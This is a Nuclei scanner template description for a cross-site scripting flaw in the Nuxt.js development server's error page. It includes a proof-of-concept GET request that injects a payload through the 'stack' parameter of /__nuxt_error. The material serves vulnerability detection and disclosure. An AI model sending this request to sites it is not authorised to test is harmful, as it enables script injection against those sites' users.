# Nuclei Template: Nuxt.js Error Page - Cross-Site Scripting
**Template ID:** nuxt-js-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`nuxt-js-xss.yaml`)

## Vulnerability Information & PoC

## Description
The developer server unsafely renders the stack trace within errors. This can be manipulated by sending a specially crafted request.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/__nuxt_error?stack=%0A{{url_encode(payload)}}
```

## References
- https://huntr.dev/bounties/70ac720d-c932-4ed3-98b1-dd2cbcb90185/
- https://bryces.io/blog/nuxt3
- https://twitter.com/fofabot/status/1669339995780558849
